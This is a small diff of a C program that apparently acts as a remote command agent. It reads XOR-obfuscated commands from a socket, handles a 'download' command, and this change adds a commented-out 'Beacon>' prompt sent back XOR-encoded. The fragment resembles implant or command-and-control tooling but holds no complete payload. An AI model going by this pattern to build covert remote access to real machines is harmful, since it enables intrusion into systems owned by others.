@@ -126,8 +126,6 @@ int main(void)
 					
 					exit(EXIT_SUCCESS);
 				}
-				// Make the parent process wait for child process to terminate
-		//		while ((wpid = wait(&status)) > 0);
 
 			}
 			else if(str_starts_with(xorbuf, "download") == 0){
@@ -185,6 +183,13 @@ int main(void)
 			
 			memset(buf, '\0', strlen(buf));
 			free(xorbuf);
+		/*	
+			char* prompt = "Beacon>\n";
+			char* xorprompt = XOR(prompt, key, strlen(prompt), keylen);
+			write(sock, xorprompt, strlen(prompt));
+			free(xorprompt);
+		*/
+
 		}
 	}
 
